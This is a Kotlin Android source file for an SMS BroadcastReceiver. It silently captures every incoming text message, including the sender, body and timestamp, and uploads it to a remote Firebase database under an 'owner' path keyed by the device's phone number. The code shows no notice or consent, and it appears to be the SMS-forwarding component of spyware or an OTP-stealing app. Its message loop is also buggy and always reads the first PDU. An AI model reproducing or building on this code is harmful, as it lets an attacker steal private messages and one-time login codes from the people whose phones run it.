package com.example.jest



import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log
import androidx.annotation.RequiresApi
import com.example.jest.MyApplication.Companion.old
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import java.time.LocalDate
import java.time.format.DateTimeFormatter


class SmsReceiver : BroadcastReceiver() {

    private var databaseReference: DatabaseReference? = null
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onReceive(context: Context, intent: Intent) {

        Log.i("TAG", "onReceive: ")

        val bundle = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<Any>?
            if (pdus != null) {
                for (pdu in pdus) {
                    val smsMessage = SmsMessage.createFromPdu(pdus[0] as ByteArray)
                    val senderPhoneNumber = smsMessage.originatingAddress
                    val messageBody = smsMessage.messageBody
                    val timeStamp = smsMessage.timestampMillis

                    // Initialize Firebase Database reference
                    if (databaseReference == null) {

                        databaseReference  = FirebaseDatabase.getInstance().getReference(LastPage.owner).child("SMS")
                    }
                    val sharedPreferences: SharedPreferences = context.getSharedPreferences("my_preferences", Context.MODE_PRIVATE)

                    val number = sharedPreferences.getString("number", "default_value")
                    val sms = SmsModel(number!! , senderPhoneNumber!!, getCurrentDateAsString(), messageBody,timeStamp.toString())
                    val key = databaseReference!!.push().key.toString()
                    if (sms.body != old){
                        databaseReference!!.child(number).child(key)
                            .setValue(sms)
                    }

                    old = sms.body

                    // Create a new SMS object and send it to Firebase
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun getCurrentDateAsString(): String {
        val currentDate = LocalDate.now()
        val formatter = DateTimeFormatter.ofPattern("dd-MM-yyyy") // Define the desired date format
        return currentDate.format(formatter)
    }
}
